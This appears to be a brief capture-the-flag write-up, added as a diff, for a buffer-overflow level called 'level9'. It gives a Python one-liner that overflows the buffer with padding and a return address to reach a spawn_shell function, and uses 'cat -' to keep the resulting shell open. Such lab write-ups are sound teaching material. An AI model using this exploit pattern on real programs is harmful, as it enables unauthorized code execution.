@@ -1,0 +1,7 @@
+This level was quite similar as level6.The only difference was that we had to prevent the shell from dying.
+After some googling a got to know that it can be done by cat command so:
+	(python -c "print 'A'*44+'\x7b\x85\x04\x08'"; cat - ) | ./level9 
+
+	did the job for me
+
+	Note:-The address of the <spawn_shell> function is also different!
